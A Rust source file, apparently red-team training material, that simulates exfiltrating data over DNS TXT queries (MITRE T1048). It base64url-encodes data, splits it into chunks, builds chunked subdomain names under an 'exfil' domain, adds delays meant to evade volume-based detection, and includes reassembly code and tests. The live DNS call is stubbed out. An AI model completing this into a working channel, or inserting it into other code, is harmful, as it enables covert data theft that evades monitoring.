// STRENGT FORTROLIG – TS
//! Exfiltration Channels – DNS TXT Chunked Exfiltration
//! 
//! Controlled simulation of large payload exfiltration via DNS TXT record chunking.
//! Implements base64url encoding with subdomain sequencing for data transmission.
//! MITRE ATT&CK: T1048 (Exfiltration Over Alternative Protocol)
//! Environment: Air-gapped string buffer simulation – no live DNS resolution

use std::collections::HashMap;

/// Maximum simulated payload size per TXT query (bytes)
/// Typical DNS label limit: 63 chars per label, 255 total query length
/// Base64url expands ~4/3, so ~200 bytes raw = ~267 chars (within limits)
const MAX_CHUNK_SIZE: usize = 200;

/// DNS TXT Exfiltration Channel with chunking support
/// Domain structure: chunk{N}of{Total}.{encoded-data}.exfil.NSM-no.internal
pub struct DnsTxtExfilChannel {
    /// Base domain for exfiltration
    base_domain: String,
    /// Simulated DNS query log (captured subdomains)
    query_log: Vec<String>,
    /// Chunk tracking for reassembly verification
    transmitted_chunks: HashMap<u32, Vec<u8>>,
}

/// Chunk metadata descriptor
#[derive(Debug, Clone)]
pub struct DataChunk {
    /// Sequence number (1-indexed)
    pub sequence: u32,
    /// Total number of chunks
    pub total: u32,
    /// Base64url encoded payload segment
    pub encoded_payload: String,
    /// Raw bytes (pre-encoding)
    pub raw_bytes: Vec<u8>,
}

/// Base64url encoding table (URL-safe variant)
/// Replaces: '+' → '-', '/' → '_', padding '=' removed
pub struct Base64UrlEncoder;

impl Base64UrlEncoder {
    /// Encode bytes to base64url string (RFC 4648)
    pub fn encode(input: &[u8]) -> String {
        const TABLE: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
        
        let mut output = String::with_capacity((input.len() * 4 + 2) / 3);
        let mut i = 0;
        
        while i < input.len() {
            let b0 = input[i];
            let b1 = input.get(i + 1).copied().unwrap_or(0);
            let b2 = input.get(i + 2).copied().unwrap_or(0);
            
            // 3 bytes → 4 chars
            let idx0 = (b0 >> 2) as usize;
            let idx1 = (((b0 & 0x03) << 4) | (b1 >> 4)) as usize;
            let idx2 = (((b1 & 0x0F) << 2) | (b2 >> 6)) as usize;
            let idx3 = (b2 & 0x3F) as usize;
            
            output.push(TABLE[idx0] as char);
            output.push(TABLE[idx1] as char);
            
            if i + 1 < input.len() {
                output.push(TABLE[idx2] as char);
            }
            if i + 2 < input.len() {
                output.push(TABLE[idx3] as char);
            }
            
            i += 3;
        }
        
        output
    }
    
    /// Decode base64url to bytes (simulated receiver capability)
    pub fn decode(input: &str) -> Vec<u8> {
        let mut output = Vec::with_capacity((input.len() * 3) / 4);
        let mut buf = 0u32;
        let mut buf_len = 0;
        
        for c in input.chars() {
            let val = match c {
                'A'..='Z' => c as u8 - b'A',
                'a'..='z' => c as u8 - b'a' + 26,
                '0'..='9' => c as u8 - b'0' + 52,
                '-' => 62,
                '_' => 63,
                _ => continue, // Ignore invalid chars
            };
            
            buf = (buf << 6) | val as u32;
            buf_len += 6;
            
            if buf_len >= 8 {
                buf_len -= 8;
                output.push((buf >> buf_len) as u8);
                buf &= (1 << buf_len) - 1;
            }
        }
        
        output
    }
}

impl DnsTxtExfilChannel {
    /// Initialize exfiltration channel with target domain
    pub fn new(base_domain: &str) -> Self {
        Self {
            base_domain: base_domain.to_string(),
            query_log: Vec::new(),
            transmitted_chunks: HashMap::new(),
        }
    }
    
    /// Chunk payload and prepare for DNS TXT exfiltration
    /// T1048: Exfiltration Over Alternative Protocol – DNS tunneling
    pub fn prepare_exfiltration(&mut self, payload: &[u8]) -> Vec<DataChunk> {
        let total_chunks = ((payload.len() + MAX_CHUNK_SIZE - 1) / MAX_CHUNK_SIZE) as u32;
        let mut chunks = Vec::with_capacity(total_chunks as usize);
        
        for (idx, chunk) in payload.chunks(MAX_CHUNK_SIZE).enumerate() {
            let sequence = (idx + 1) as u32;
            let encoded = Base64UrlEncoder::encode(chunk);
            
            chunks.push(DataChunk {
                sequence,
                total: total_chunks,
                encoded_payload: encoded,
                raw_bytes: chunk.to_vec(),
            });
        }
        
        chunks
    }
    
    /// Construct fully qualified domain name for chunk transmission
    /// Format: chunk{N}of{Total}.{encoded-data}.{base-domain}
    pub fn construct_fqdn(&self, chunk: &DataChunk) -> String {
        // Subdomain prefix indicates chunk position
        let prefix = format!("chunk{}of{}", chunk.sequence, chunk.total);
        
        // Insert encoded data as subdomain label
        // Note: DNS labels max 63 chars, so we may need to split further for real DNS
        // For simulation, we keep as single conceptual label
        format!("{}.{}.{}", prefix, chunk.encoded_payload, self.base_domain)
    }
    
    /// Simulate DNS TXT query transmission (air-gapped stub)
    /// Returns simulated query string for logging/analysis
    pub fn transmit_chunk(&mut self, chunk: &DataChunk) -> String {
        let fqdn = self.construct_fqdn(chunk);
        
        // Simulate DNS query transmission
        // In live environment: dns_query(fqdn, TXT, resolver)
        self.query_log.push(fqdn.clone());
        self.transmitted_chunks.insert(chunk.sequence, chunk.raw_bytes.clone());
        
        fqdn
    }
    
    /// Execute full exfiltration of payload
    pub fn exfiltrate_payload(&mut self, payload: &[u8]) -> ExfiltrationResult {
        let chunks = self.prepare_exfiltration(payload);
        let mut transmitted_fqdns = Vec::with_capacity(chunks.len());
        
        for chunk in &chunks {
            let fqdn = self.transmit_chunk(chunk);
            transmitted_fqdns.push(fqdn);
            
            // Simulate inter-query delay (jitter) for evasion
            // T1048 variant: Slow DNS exfiltration to avoid volume-based detection
            std::thread::sleep(std::time::Duration::from_millis(100));
        }
        
        ExfiltrationResult {
            chunks_transmitted: chunks.len() as u32,
            total_bytes: payload.len() as u32,
            fqdns: transmitted_fqdns,
            base_domain: self.base_domain.clone(),
        }
    }
    
    /// Verify transmission integrity (receiver simulation)
    pub fn verify_reassembly(&self) -> Option<Vec<u8>> {
        if self.transmitted_chunks.is_empty() {
            return None;
        }
        
        let max_seq = *self.transmitted_chunks.keys().max().unwrap();
        let mut reassembled = Vec::new();
        
        for i in 1..=max_seq {
            match self.transmitted_chunks.get(&i) {
                Some(data) => reassembled.extend_from_slice(data),
                None => return None, // Missing chunk
            }
        }
        
        Some(reassembled)
    }
    
    /// Retrieve simulated DNS query log for analysis
    pub fn get_query_log(&self) -> &[String] {
        &self.query_log
    }
    
    /// Calculate exfiltration bandwidth metrics
    pub fn calculate_metrics(&self, payload_size: usize, duration_secs: f64) -> ExfilMetrics {
        let queries = self.query_log.len() as f32;
        let bytes_per_query = payload_size as f32 / queries;
        let bps = (payload_size as f32 * 8.0) / duration_secs as f32;
        
        ExfilMetrics {
            queries,
            bytes_per_query,
            bits_per_second: bps,
            overhead_ratio: (queries * 50.0) / payload_size as f32, // DNS overhead estimate
        }
    }
}

#[derive(Debug)]
pub struct ExfiltrationResult {
    pub chunks_transmitted: u32,
    pub total_bytes: u32,
    pub fqdns: Vec<String>,
    pub base_domain: String,
}

#[derive(Debug)]
pub struct ExfilMetrics {
    pub queries: f32,
    pub bytes_per_query: f32,
    pub bits_per_second: f32,
    pub overhead_ratio: f32,
}

/// Training scenario: Exfiltrate simulated sensitive data
pub fn run_dns_exfil_scenario() {
    // Simulated payload: 1500 bytes (typical MTU-sized data chunk)
    let payload: Vec<u8> = (0..1500).map(|i| (i % 256) as u8).collect();
    
    let mut channel = DnsTxtExfilChannel::new("exfil.NSM-no.internal");
    
    println!("Initiating DNS TXT exfiltration (T1048)...");
    println!("Payload size: {} bytes", payload.len());
    
    let result = channel.exfiltrate_payload(&payload);
    
    println!("Transmitted {} chunks", result.chunks_transmitted);
    println!("Sample FQDN: {}", result.fqdns.first().unwrap_or(&"none".to_string()));
    
    // Verify integrity
    if let Some(reassembled) = channel.verify_reassembly() {
        assert_eq!(reassembled, payload);
        println!("Reassembly verified: {} bytes", reassembled.len());
    }
    
    // Metrics
    let metrics = channel.calculate_metrics(payload.len(), 5.0);
    println!("Exfiltration metrics: {:.2} bps", metrics.bits_per_second);
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_chunking_logic() {
        let payload = vec![0u8; 450]; // 450 bytes = 3 chunks (200+200+50)
        let mut channel = DnsTxtExfilChannel::new("test.internal");
        let chunks = channel.prepare_exfiltration(&payload);
        
        assert_eq!(chunks.len(), 3);
        assert_eq!(chunks[0].sequence, 1);
        assert_eq!(chunks[0].total, 3);
        assert_eq!(chunks[2].sequence, 3);
    }
    
    #[test]
    fn test_base64url_roundtrip() {
        let data = b"Exfiltration test data! @#$%^&*()";
        let encoded = Base64UrlEncoder::encode(data);
        let decoded = Base64UrlEncoder::decode(&encoded);
        
        assert_eq!(data.to_vec(), decoded);
        assert!(!encoded.contains('+'));
        assert!(!encoded.contains('/'));
        assert!(!encoded.contains('='));
    }
    
    #[test]
    fn test_fqdn_construction() {
        let mut channel = DnsTxtExfilChannel::new("exfil.NSM-no.internal");
        let chunk = DataChunk {
            sequence: 2,
            total: 5,
            encoded_payload: "dGVzdC1kYXRh".to_string(),
            raw_bytes: vec![0x00, 0x01, 0x02],
        };
        
        let fqdn = channel.construct_fqdn(&chunk);
        assert!(fqdn.starts_with("chunk2of5.dGVzdC1kYXRh."));
        assert!(fqdn.ends_with(".exfil.NSM-no.internal"));
    }
    
    #[test]
    fn test_exfiltration_integrity() {
        let payload = b"Sensitive operational data for T1048 simulation".to_vec();
        let mut channel = DnsTxtExfilChannel::new("test.internal");
        
        channel.exfiltrate_payload(&payload);
        let recovered = channel.verify_reassembly().unwrap();
        
        assert_eq!(payload, recovered);
    }
}



